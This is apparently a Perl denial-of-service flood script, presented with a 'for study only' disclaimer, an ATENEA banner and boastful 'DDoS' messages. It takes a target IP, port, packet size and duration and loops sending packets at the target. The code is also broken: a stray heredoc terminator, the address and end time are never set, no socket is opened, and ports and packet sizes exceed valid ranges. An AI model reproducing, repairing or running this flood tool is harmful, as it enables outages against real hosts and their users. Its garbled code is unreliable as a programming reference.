#!/usr/bin/perl

#~~~~> SI TIENE CONOCIMIENTO Y NO ES UN LAMMER, NO MODIFIQUE EL ESCRITO
#~~~~> Solo para estudios

 #Created by 𝓢𝓾𝓰𝓸𝓢𝓬𝓻𝓲𝓹
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
EOTEXT
print BOLD RED<<EOTEXT;

                                                                                                                                                                            
   ###    ######## ######## ##    ## ########    ###    
  ## ##      ##    ##       ###   ## ##         ## ##   
 ##   ##     ##    ##       ####  ## ##        ##   ##  
##     ##    ##    ######   ## ## ## ######   ##     ## 
#########    ##    ##       ##  #### ##       ######### 
##     ##    ##    ##       ##   ### ##       ##     ## 
##     ##    ##    ######## ##    ## ######## ##     ## 

EOTEXT
 
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print "~ We are the law ~ $ip " . ($port ? $port : "random") . "-" .
  ($size ? "$size-byte" : "Get No Routed Bitch!?") . "
~ DDoS <3.
~ #ATNEA_Ddos ~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Stoping comand: Ctrl-C\n" unless $time;  
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
 $iaddr));}
